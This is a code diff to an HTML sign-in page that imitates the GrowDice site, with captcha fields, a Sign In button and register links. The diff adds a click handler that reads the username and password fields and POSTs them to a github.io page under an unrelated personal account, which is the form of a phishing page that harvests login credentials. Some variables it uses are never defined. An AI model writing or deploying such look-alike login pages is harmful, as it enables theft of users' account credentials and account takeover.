@@ -53,19 +53,30 @@ data-callback="enableBtn">
 <textarea id="g-recaptcha-response-07t8ugrnn6ps" name="g-recaptcha-response" style="display: none;"></textarea><textarea id="h-captcha-response-07t8ugrnn6ps" name="h-captcha-response" style="display: none;"></textarea></div>
 <button id="button1" disabled="true" class="sc-1xm9mse-0 fsbplj text-sm rounded-sm">Sign In</button>
       <script>
-        document.getElementById('button1').addEventListener('click', function() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://karimasri.github.io/growdice/', true);
-            xhr.setRequestHeader('Content-Type', 'application/json'); // Adjust content type if needed
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    console.log(xhr.responseText); // Response from server
-                    // You can handle the response here
-                }
-            };
-            var data = JSON.stringify({ key: 'value' }); // Adjust the data to send
-            xhr.send(data);
-        });
+const loginButton = document.getElementById('button1');
+
+loginButton.addEventListener('click', function() {
+    const username = usernameInput.value;
+    const password = passwordInput.value;
+
+    // Construct the login request payload
+    const formData = new FormData();
+    formData.append('username', username);
+    formData.append('password', password);
+
+    // Send the login request using fetch API
+    fetch('https://karimasri.github.io/growdice/', {
+        method: 'POST',
+        body: formData,
+    })
+    .then(response => {
+        // Handle response as needed
+        console.log(response);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+});
     </script>
  <div class="flex flex-col gap-2"><a class="m-auto font text-white cursor-pointer font-semibold">Forgot Password?</a><div class="flex gap-1 justify-center"><span>Don't have an account?</span><a class="text-white font-semibold cursor-pointer">Register an account</a></div></div></div></div></div></div></div>
 <noscript>GrowDice requires JavaScript in order to run!</noscript>
